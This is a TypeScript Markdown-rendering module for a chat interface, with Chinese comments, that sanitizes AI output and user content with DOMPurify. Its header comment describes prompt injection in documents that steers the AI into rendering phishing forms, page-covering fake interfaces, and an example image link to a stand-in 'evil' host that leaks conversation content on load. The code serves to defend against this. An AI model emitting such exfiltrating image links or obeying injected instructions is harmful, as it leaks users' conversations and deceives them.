import DOMPurify from 'dompurify'
import { marked } from 'marked'

// 聊天回答、Markdown 组件都用 v-html 渲染 AI 输出和用户内容，这里是唯一的防线。
// 光去掉脚本不够——AI 输出可能被文档里的“提示注入”操纵，渲染出：
//   1. 钓鱼表单（假的“请重新输入密码”）；
//   2. 用 style / Tailwind class（fixed inset-0 z-50…）盖住整个页面的假界面；
//   3. 外链图片：![x](https://evil/leak?d=对话内容)，图片一加载数据就发出去了（零点击外泄）。
// 所以除了 DOMPurify 的默认规则，还要：禁表单控件和媒体标签、禁 style/id/name/srcset 等属性、
// class 只保留渲染本身需要的两种、图片只允许 data: 图片和本站地址，其余改成显式链接让用户自己决定要不要点。
const FORBID_TAGS = ['form', 'input', 'button', 'select', 'option', 'optgroup', 'textarea', 'fieldset', 'legend', 'label', 'video', 'audio', 'source',
  'track', 'picture', 'marquee', 'style', 'link', 'meta', 'base']
const FORBID_ATTR = ['style', 'id', 'name', 'action', 'formaction', 'srcset', 'poster', 'background', 'ping', 'autofocus']
const ALLOWED_CLASS = /^(cite-ref|language-[a-z0-9+#_-]{1,30})$/i
const SAFE_DATA_IMAGE = /^data:image\/(png|jpe?g|gif|webp);base64,[a-z0-9+/=]+$/i

function isSameOrigin(src: string): boolean {
  try {
    const url = new URL(src, window.location.origin)
    return url.origin === window.location.origin
  } catch {
    return false
  }
}

let hooked = false
function installHooks() {
  if (hooked) return
  hooked = true
  DOMPurify.addHook('afterSanitizeAttributes', (node: Element) => {
    if (node.hasAttribute?.('class')) {
      const kept = (node.getAttribute('class') || '').split(/\s+/).filter((token) => ALLOWED_CLASS.test(token))
      if (kept.length) node.setAttribute('class', kept.join(' '))
      else node.removeAttribute('class')
    }
    if (node.tagName === 'IMG') {
      const src = node.getAttribute('src') || ''
      if (!SAFE_DATA_IMAGE.test(src) && !(src.startsWith('/') && !src.startsWith('//') && isSameOrigin(src))) {
        // 外部图片不自动加载：换成一个明确的链接，用户点了才会去访问
        const link = document.createElement('a')
        link.textContent = `[外部图片：${(() => { try { return new URL(src, window.location.origin).hostname } catch { return '未知地址' } })()}]`
        if (/^https?:\/\//i.test(src)) {
          link.setAttribute('href', src)
          link.setAttribute('target', '_blank')
          link.setAttribute('rel', 'noopener noreferrer nofollow')
        }
        node.replaceWith(link)
      }
    }
    if (node.tagName === 'A' && node.getAttribute('target') === '_blank') {
      node.setAttribute('rel', 'noopener noreferrer nofollow')
    }
  })
}

export function renderMarkdown(text: string, citations = false): string {
  installHooks()
  // 脚本生成的文件链接是 [名称](attachment://ID)。DOMPurify 会删掉未知协议的 href，
  // 所以先改成页内锚点，点击时由页面拦截并带登录态下载。
  const source = (text || '').replace(/\]\(attachment:\/\/([0-9a-f]{24})\)/g, '](#attachment-$1)')
  let html = marked.parse(source, { async: false }) as string
  if (citations) {
    html = html.replace(/【来源(\d+)】/g, '<span class="cite-ref" data-cite="$1">【来源$1】</span>')
  }
  return DOMPurify.sanitize(html, { USE_PROFILES: { html: true }, FORBID_TAGS, FORBID_ATTR })
}
